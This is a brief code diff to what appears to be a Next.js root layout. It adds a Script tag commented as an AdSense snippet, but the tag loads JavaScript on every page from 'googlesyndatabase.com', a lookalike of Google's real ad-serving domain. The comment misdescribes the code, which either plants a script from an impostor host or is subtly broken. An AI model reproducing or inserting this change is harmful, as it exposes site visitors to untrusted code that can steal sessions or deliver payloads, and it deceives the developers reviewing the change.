@@ -88,6 +88,15 @@ export default function RootLayout({
   return (
     <ClerkProvider>
       <html lang="en" suppressHydrationWarning>
+        <head>
+          {/* Add AdSense script */}
+          <Script
+            async
+            src="https://pagead2.googlesyndatabase.com/pagead/js/adsbygoogle.js?client=ca-pub-9812963383908086"
+            crossOrigin="anonymous"
+            strategy="afterInteractive"
+          />
+        </head>
         <body className={inter.className}>
           <ThemeProvider
             attribute="class"
